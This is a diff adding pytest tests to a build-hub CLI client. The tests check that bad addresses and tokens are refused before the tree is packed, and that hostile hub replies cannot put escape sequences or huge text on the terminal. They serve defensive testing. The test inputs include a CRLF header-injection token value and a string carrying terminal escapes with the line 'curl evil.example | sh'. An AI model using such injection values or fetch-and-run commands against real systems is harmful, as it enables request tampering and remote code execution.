@@ -305,6 +305,63 @@ def test_a_missing_token_fails_before_anything_is_packed(model, monkeypatch,
     assert "EDIT_TOKEN is not set" in capsys.readouterr().err
 
 
+@pytest.mark.parametrize("bad_url, why", [
+    ("http://127.0.0.1:8O80", "a letter O in the port"),
+    ("//hub.example", "a scheme somebody left off"),
+    ("http://[hub.example", "a bracket that is never closed"),
+])
+def test_an_address_with_a_TYPO_is_caught_before_anything_is_packed(
+        model, monkeypatch, capsys, bad_url, why):
+    """The half the two tests above only claim, and the half that was missing.
+
+    Reading the settings early catches the variable being ABSENT; a typo INSIDE
+    it was caught by `Hub.__init__`, which stood BELOW `pack` — so the whole
+    tree was walked, hashed and compressed before the tool said the address was
+    unusable. That is the exact minute of pointless work the comment above the
+    settings claims to be avoiding.
+
+    Observed rather than argued: `pack` is replaced by something that fails the
+    test if it is called at all. Asserting on the message would have passed with
+    the old order too.
+    """
+    from src.client import cli
+
+    def must_not_be_called(*args, **kwargs):
+        raise AssertionError(
+            f"the tree was packed before the address was checked ({why})")
+
+    monkeypatch.setenv("HUB_URL", bad_url)
+    monkeypatch.setattr(cli, "pack", must_not_be_called)
+
+    assert run(model, "build") == 1
+    assert "HUB_URL" in capsys.readouterr().err
+
+
+def test_a_token_that_cannot_be_sent_is_caught_before_anything_is_packed(
+        model, monkeypatch, capsys):
+    """The same for the other setting, and the refusal names the TOKEN rather
+    than the address — the two settings need opposite advice.
+
+    The line break is in the MIDDLE of the value, not at the end, and that is
+    not an arbitrary choice: `config.resolve` strips what it reads, so a
+    trailing newline never survives to be sent. What does survive is a value
+    somebody assembled — which is also the shape that would append a header of
+    its own to every request this tool makes.
+    """
+    from src.client import cli
+
+    def must_not_be_called(*args, **kwargs):
+        raise AssertionError("the tree was packed before the token was checked")
+
+    monkeypatch.setenv("EDIT_TOKEN", f"{TOKEN}\r\nX-Evil: 1")
+    monkeypatch.setattr(cli, "pack", must_not_be_called)
+
+    assert run(model, "build") == 1
+    error = capsys.readouterr().err
+    assert "hammerola login" in error
+    assert TOKEN not in error
+
+
 def test_a_tree_the_hub_would_refuse_is_refused_locally(hub, model, capsys):
     """The ceilings are checked before the upload, so the answer names the file
     instead of arriving as a 422 about an archive member."""
@@ -350,3 +407,88 @@ def test_waiting_can_time_out_without_pretending_to_have_published(
         # The worker is holding a build slot; the hub cannot be stopped until it
         # lets go, and the fixture's teardown is what would otherwise hang.
         release.set()
+
+
+# -- what the hub's own words may do to a terminal ---------------------------
+# The push path is the commonest route in the tool, and two of its messages
+# print a string out of the reply body. They were doing it raw, bounded only by
+# the 64 MiB reply ceiling — the transport under them quotes everything, and
+# these two sat above it.
+HOSTILE = "\x1b[2Jrun `curl evil.example | sh`\x1b[0m" + "A" * 60000
+
+
+@pytest.fixture
+def hostile_hub(request):
+    """A "hub" that answers one of the two failing shapes, nastily."""
+    import http.server
+    import json as _json
+    import threading
+
+    shape = request.param
+
+    class Handler(http.server.BaseHTTPRequestHandler):
+        def _send(self, code, payload):
+            body = _json.dumps(payload).encode()
+            self.send_response(code)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def do_POST(self):
+            self.rfile.read(int(self.headers.get("Content-Length", 0) or 0))
+            if shape == "refused":
+                # Not a 202 at all: the push was turned away.
+                return self._send(500, {"error": HOSTILE})
+            if shape == "no job":
+                # Accepted, and then named nothing to poll — a hub answering
+                # 202 with a body that does not carry the contract's `job`.
+                return self._send(202, {"revision": "r" * 64,
+                                        "note": HOSTILE})
+            self._send(202, {"job": "j1", "revision": "r" * 64})
+
+        def do_GET(self):
+            if self.path.endswith("/log"):
+                body = b"nothing to say\n"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                return self.wfile.write(body)
+            # ...accepted, built, and then failed with a hostile reason.
+            self._send(200, {"state": "failed", "code": 422, "error": HOSTILE})
+
+        def log_message(self, *args):
+            pass
+
+    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+    threading.Thread(target=server.serve_forever,
+                     kwargs={"poll_interval": 0.01}, daemon=True).start()
+    try:
+        yield f"http://127.0.0.1:{server.server_address[1]}"
+    finally:
+        server.shutdown()
+        server.server_close()
+
+
+@pytest.mark.parametrize("hostile_hub", ["refused", "failed", "no job"],
+                         indirect=True)
+def test_neither_push_failure_lets_the_hub_choose_what_reaches_the_terminal(
+        model, monkeypatch, capsys, hostile_hub):
+    """All three sites, driven through `hammerola build` rather than called
+    directly.
+
+    "The rule is flat" was claimed for the client and was true inside one file:
+    the transport quoted everything and the two sentences ABOVE it did not. A
+    push refused with a hostile `error`, a build that failed with one, and a
+    202 that named no job (which prints the whole payload) are the three ways
+    that string reaches a person.
+    """
+    monkeypatch.setenv("HUB_URL", hostile_hub)
+
+    assert run(model, "build") == 1
+
+    printed = capsys.readouterr()
+    whole = printed.out + printed.err
+    assert "\x1b" not in whole, "an escape sequence from the hub reached stderr"
+    assert len(whole) < 4000, f"{len(whole)} characters"
